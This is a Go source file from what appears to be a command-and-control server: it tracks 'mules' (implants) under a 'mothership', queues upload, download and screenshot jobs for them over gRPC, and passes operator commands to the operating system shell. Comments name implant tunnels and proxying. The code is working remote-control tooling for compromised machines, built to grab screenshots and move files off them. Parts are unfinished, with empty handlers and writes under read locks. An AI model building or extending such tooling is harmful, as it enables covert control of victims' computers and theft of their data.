package lib

import(
  "fmt"
  "sync"
  "errors"
  "strings"
  "os/exec"
  "context"

  "odin/lib/utils"
  "odin/wheagle/server/grpcapi"
)

type MSRunner struct {
  MSId string
  PrevMSId string
  Password string
  Mules []string
  Operators []string
  mu sync.RWMutex
}

/*possible events(Self EDR Implementation)
type EvetsData struct{
  Occuranace tume.Time
  Handle bool
  Description string
}
*/
func SetRunningConfigurations(msid,password string)*MSRunner{
  var mules,operators []string
  return &MSRunner{
    MSId: msid,
    PrevMSId: msid,
    Password: password,
    Mules: mules,
    Operators: operators,
    mu: sync.RWMutex{},
  }
}

func (msr *MSRunner) UpdateMSId(msid string) {
  msr.mu.RLock()
	defer msr.mu.RUnlock()
  msr.PrevMSId = msr.MSId
  msr.MSId = msid
}
//remeber to chage to use bcrypt
func (msr *MSRunner) MSAuthenticate(pass string)error{
  msr.mu.RLock()
	defer msr.mu.RUnlock()
  err := utils.CheckPasswordHash(pass,msr.Password)
  if err != nil {
    return fmt.Errorf("Error, wrong password")//%v err
  }
  return nil
}

func (msr *MSRunner) MSUpdatePassword(newHash string){
  msr.mu.RLock()
	defer msr.mu.RUnlock()
  msr.Password = newHash
}

func (msr *MSRunner) ListMules() []string{
  var mules []string
  msr.mu.RLock()
	defer msr.mu.RUnlock()
  for _,muleId := range msr.Mules {
    mules = append(mules,muleId)
  }
  return mules
}

func (msr *MSRunner) UpdateRunningMode(){}

func (msr *MSRunner) MSRemoveMule(muleId string)error{
  msr.mu.RLock()
	defer msr.mu.RUnlock()
  for _,mule := range msr.Mules {
    if mule == muleId {
      //remove from array :)
      msr.Mules = utils.RemoveElementFromArray(msr.Mules,muleId)
    }
  }
  return nil
}

func (msr *MSRunner) ADDMule(muleId,msId string) error{
  msr.mu.RLock()
	defer msr.mu.RUnlock()
  if msr.MSId != msId {
    return errors.New("Wrong Mothership ID, GO find your momaaa. :()")
  }
  for _,mule := range msr.Mules {
    if mule == muleId {
      return fmt.Errorf("Mule with ID %v already exists",errors.New(muleId))
    }
  }
  msr.Mules = append(msr.Mules,muleId)
  utils.PrintTextInASpecificColorInBold("cyan","Added mule to mules........... "+muleId)
  return nil
}

//file operations
func (srv *AdminServer) SendUpload(ctx context.Context, in *grpcapi.File)(*grpcapi.FileMessage,error){
  tunnelIn := srv.ACave.CreateTunnel()
  tunnelOut := srv.ACave.CreateTunnel()
  errChan := srv.ACave.CreateTunnel()
  go func(){
    work := &Jacuzzi{
      OperatorId: tunnelIn.Id,
      CmdIn: "upload",
      CmdOut: tunnelOut.Id,
      Done: false,
    }
    if err := srv.APillar.AddWork(in.UserId,work); err != nil{
      errChan.Data <- err;return
    }
    tunnelIn.Data <- in
    errChan.Data <- ErrWorkWrittenIn
  }()
  if err := <- errChan.Data;err != nil{
    e,ok := err.(error)
    if !ok {
      return nil,errors.New("Error reading from errors channel")
    }
    if errors.Is(e,ErrWorkWrittenIn){
      val,ok := <- tunnelOut.Data
      if !ok{
        _ = srv.ACave.CloseTunnel(tunnelOut.Id)
        _ = srv.ACave.CloseTunnel(tunnelIn.Id)
        _ = srv.ACave.CloseTunnel(errChan.Id)
        return nil,fmt.Errorf("Error reading message data")
      }
      msg,ok := val.(*grpcapi.FileMessage)
      if !ok {
        _ = srv.ACave.CloseTunnel(tunnelOut.Id)
        _ = srv.ACave.CloseTunnel(tunnelIn.Id)
        _ = srv.ACave.CloseTunnel(errChan.Id)
        return nil,fmt.Errorf("Error asserting into mesage data")
      }
      return msg,nil
    }
  }
  return nil,errors.New("Error reading from errors channel")
}


func (srv *AdminServer) ReceiveDownload(ctx context.Context, in *grpcapi.FileMessage)(*grpcapi.File,error){
  var fl = new(grpcapi.File)
  tunnelOut := srv.ACave.CreateTunnel()
  errChan := srv.ACave.CreateTunnel()
  go func(){
    work := &Jacuzzi{
      OperatorId:tunnelOut.Id,
      CmdIn: "download",
      CmdOut:in.Directory,
      Done: false,
    }
    if err := srv.APillar.AddWork(in.UserId,work); err != nil{
      errChan.Data <- err;return
    }
    errChan.Data <- ErrWorkWrittenIn
  }()
  // reading from cave download signal
  if err := <- errChan.Data; err != nil{
    if errors.Is(err.(error),ErrWorkWrittenIn){
      val,ok := <- tunnelOut.Data
      if !ok{
        _ = srv.ACave.CloseTunnel(tunnelOut.Id)
        _ = srv.ACave.CloseTunnel(errChan.Id)
        return nil,fmt.Errorf("Error reading from tunnel out data.")
      }
      fl,ok = val.(*grpcapi.File)
      if !ok {
        _ = srv.ACave.CloseTunnel(tunnelOut.Id)
        _ = srv.ACave.CloseTunnel(errChan.Id)
        return nil,errors.New("Error asserting into file value")
      }
      _ = srv.ACave.CloseTunnel(tunnelOut.Id)
      _ = srv.ACave.CloseTunnel(errChan.Id)
      return fl,nil
    }
    return nil,errors.New("Error reading from errors channel")
  }
  // receive file from tunnel out
  return fl,nil
}

func (srv *AdminServer) RunScreenShot(ctx context.Context, in *grpcapi.Command) (*grpcapi.Screenshots, error){
  tunnelOut := srv.ACave.CreateTunnel()
  errChan := srv.ACave.CreateTunnel()
  var scnt = new(grpcapi.Screenshots)
  //write to work
  go func(){
    work := &Jacuzzi{
      OperatorId: "INTERACTIVE",
      CmdIn: "screenshot",
      CmdOut: tunnelOut.Id,
      Done: false,
    }
    if err := srv.APillar.AddWork(in.UserId,work); err != nil{
      errChan.Data <- err;return
    }
    errChan.Data <- ErrWorkWrittenIn
  }()
  //ensure there was no error
  if err := <- errChan.Data; err != nil{
    if errors.Is(err.(error),ErrWorkWrittenIn){
      val,ok := <- tunnelOut.Data
      if !ok{
        _ = srv.ACave.CloseTunnel(tunnelOut.Id)
        _ = srv.ACave.CloseTunnel(errChan.Id)
        return nil,fmt.Errorf("Error reading from tunnel ou data.")
      }
      scnt,ok = val.(*grpcapi.Screenshots)
      if !ok {
        return nil,errors.New("Error asserting into screenshot value")
      }
      _ = srv.ACave.CloseTunnel(tunnelOut.Id)
      _ = srv.ACave.CloseTunnel(errChan.Id)
      return scnt,nil
    }
    return nil,fmt.Errorf("Error adding work to pool: %q",err)
  }
  return scnt,nil
}


//shell interactive functions
func (runner *AdminServer) RunAC2Command(ctx context.Context,cmd *grpcapi.C2Command) (*grpcapi.C2Command,error){
  //var res *grpcapi.C2Command
  switch cmd.In {
    case "", " ":
      cmd.Out = "Command can not be empty."
      return cmd,nil
    default:
      if cmd.Individual && cmd.MSId == runner.Config.MSId {
        //handle it as individual then return the output
        cmd.Out = AdminCommandHandler(cmd.In)
        return cmd,nil
      } else {
        if !cmd.Individual && cmd.MSId == "ALL"{
          //handles it as one for the team
          cmd.Out = AdminCommandHandler(cmd.In)
          return cmd,nil
        }
      }
      return cmd,nil
  }
  return cmd,nil
}

var AdminCommandHandler = func(cmd string)(output string){
  if strings.HasPrefix(cmd,"int"){
    switch cmd {
      case "sleep":
      case "killall":
      case "events":
      case "proxify":
      case "tunnI"://creates an implant tunnel
      case "tunnA":
      default:
        return output
    }
  } else {
    // do a normal os Exec
    tokens := strings.Split(cmd," ")
    var c *exec.Cmd
    if len(tokens) == 1 {
      c = exec.Command(tokens[0])
    } else {
      c = exec.Command(tokens[0],tokens[1:]...)
    }
    buf,err := c.CombinedOutput()
    if err != nil {
      return fmt.Sprintf("%v",err)
    }
     output = string(buf)
  }
  return output
}


/*
if cmd.In == ""{}
if cmd.In != "" && cmd.Individual && cmd.MSId == runner.Config.MSId {
  //handle it as individual then return the output
  cmd.Out = AdminCommandHandler(cmd.In)
}
if cmd.In != "" && !cmd.Individual && cmd.MSId == "ALL"{
  //handles it as one for the team
  cmd.Out = AdminCommandHandler(cmd.In)
}

func (srv *MSRunner) GetC2Command(ctx context.Context, empty *grpcapi.Empty)(*grpcapi.C2Command,error){
  var c2Cmd = new(grpcapi.C2Command)
  select {
    case c2Cmd,ok := srv.Work:
    if ok {
      return c2Cmd,nil
    }
    return c2Cmd,errors.New("Channel closed")
  default:
    return c2Cmd,nil
  }
}

func (srv *MSRunner) SendC2Output(ctx context.Context, result *grpcapi.C2Command)(*grpcapi.Empty,error){
  srv.Output <- result
  return &grpcapi.Empty{},nil
}
*/
